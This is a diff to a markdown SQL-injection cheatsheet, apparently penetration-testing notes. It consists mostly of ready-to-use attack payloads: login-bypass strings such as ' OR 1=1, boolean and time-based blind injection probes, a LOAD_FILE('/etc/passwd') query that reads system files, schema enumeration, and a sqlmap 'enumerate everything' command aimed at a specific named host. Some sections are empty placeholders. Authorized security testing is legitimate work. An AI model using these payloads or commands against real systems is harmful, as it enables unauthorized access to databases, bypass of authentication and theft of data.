@@ -192,15 +192,18 @@ Another LFI / LFI->RCE Cheatsheet:
 
 SQL Cheatsheet: http://www.cheat-sheets.org/sites/sql.su/
 
-**Enumerate DB Metadata**  
-via. 'INFORMATION_SCHEMA' view
+Enumerate DB metadata via. 'INFORMATION_SCHEMA' view:
 ```
 information_schema
 SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST
 SELECT * FROM INFORMATION_SCHEMA.TABLES
 ```
 
-**Logic Alternatives**
+Read files:
+`SELECT LOAD_FILE('/etc/passwd');`
+
+
+Logic Alternatives:
 ```
 and -> &&
 or -> ||
@@ -208,7 +211,7 @@ or -> ||
 != -> not like
 ```
 
-**Authentication Bypass**
+Authentication Bypass:
 ```
 Auth Form Bypass Example: SELECT * FROM Users WHERE user_id=’’ OR 1=1; /* ‘ AND password= ‘ */ — ‘
   [user_field]’ OR 1=1; /*
@@ -220,7 +223,8 @@ Other things try:
   ' or '1'='1
   ' or '1'='1 --
 ```
-**Logic Testing**
+
+Logic Testing / Boolean Blind SQLi
 ```
 page.asp?id=1 or 1=1 -- true
 page.asp?id=1' or 1=1 -- true
@@ -228,30 +232,30 @@ page.asp?id=1" or 1=1 -- true
 page.asp?id=1 and 1=2 -- false
 ```
 
-**Verification: Blind SQLi**
+Verification: Blind SQLi
 ```
 %' AND 1=1 AND '%'='                  // BOOLEAN: TRUE
 %' AND 1=0 AND '%'='                  // BOOLEAN: FALSE
 company=sap%' AND SLEEP(5) AND '%'='  // TIME-BASED
 ```
 
-**Select/Union: Exfiltrating data**
+Select/Union (Exfiltrating data):
 ```
 ns.agency/stuff.php?id=3 order by 1
 
 ```
 
-**Insert**
+Insert:
 ```
 add stuff here
 ```
 
-**Chained Queries**
+Stacked Queries:
 ```
 add stuff here
 ```
 
-**Sqlmap Commands**
+Sqlmap:
 ```
 Enumerate everything:
 $ python sqlmap.py -u https://internship.dev.ns.agency/secret/api/to/get/jobs/?company=sap -a --level=3
